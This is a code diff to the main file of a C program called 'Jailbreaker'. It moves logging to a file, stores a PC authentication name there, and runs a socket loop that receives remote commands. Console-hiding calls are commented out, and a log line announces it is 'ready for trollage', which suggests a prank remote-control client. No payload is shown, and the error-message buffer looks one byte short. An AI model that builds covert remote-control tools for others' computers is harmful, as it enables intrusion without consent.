@@ -7,37 +7,51 @@
 #include "src/Funnies.h"
 #include "src/Socket.h"
 
-// TODO: log these to files instead of console
-#if !(__MSVCRT_VERSION__ < __MSVCR80_DLL || defined _USE_32BIT_TIME_T)
-    void JBlog(const char* message) {
-        printf("%lli - %s\n", time(NULL), message);
-    }
-    void JBlogErr(const char *message) {
-        printf("%lli - ERROR: %s\n", time(NULL), message);
-    }
-#else
-    void JBlog(const char* message) {
-        printf("%li - %s\n", time(NULL), message);
-    }
-    void JBlogErr(const char *message) {
-        printf("%li - ERROR: %s\n", time(NULL), message);
-    }
-#endif
+
+void JBlog(const char *msg) {
+    FILE *fpLog = fopen("JB.log", "a");
+    fprintf(fpLog, "%lli - %s\n", time(NULL), msg);
+    fclose(fpLog);
+}
+// just appends and calls JBlog()
+void JBlogErr(const char *msg) {
+    char errMsg[strlen(msg) + 7];
+    sprintf(errMsg, "ERROR: %s", msg);
+    JBlog(errMsg);
+}
 
 
-extern const char *PCName; // PC authentication
+extern char PCName[AUTH_LENGTH]; // PC authentication
 
-int main(int argc, char *argv[])
-{
+void JBinit(const char *arg) {
     // Hide console
     //HWND window = GetConsoleWindow();
     //ShowWindow(window, SW_MINIMIZE);
     //ShowWindow(window, SW_HIDE);
 
-    if (!argv[1]) {
-        JBlogErr("Callname not defined.");
-        return 1;
+    if (!access("JB.log", F_OK)) { // check if log file exists
+        FILE *logFp = fopen("JB.log", "r");
+
+        fgets(PCName, AUTH_LENGTH, logFp);
+        fclose(logFp);
+
+        PCName[strlen(PCName) - 1] = '\0'; // trim the \n
     }
+    else if (arg) {
+        strcpy(PCName, arg);
+
+        FILE *logFp = fopen("JB.log", "w");
+        fprintf(logFp, "%s\n%lli - Jailbreaker installed and ready for trollage.\n", PCName, time(NULL));
+        fclose(logFp);
+    }
+    else exit(1); // no log file or cmd arg
+}
+
+
+int main(int argc, char *argv[])
+{
+    setlocale(LC_ALL, ""); // for wchar consistency
+    JBinit(argv[1]);
 
     struct TeltharSocket tsocket;
 
@@ -47,7 +61,6 @@ int main(int argc, char *argv[])
         return -1;
     }
     
-    PCName = argv[1];
     JBCMD recv;
 
     /* ---- Main recieving loop ---- */
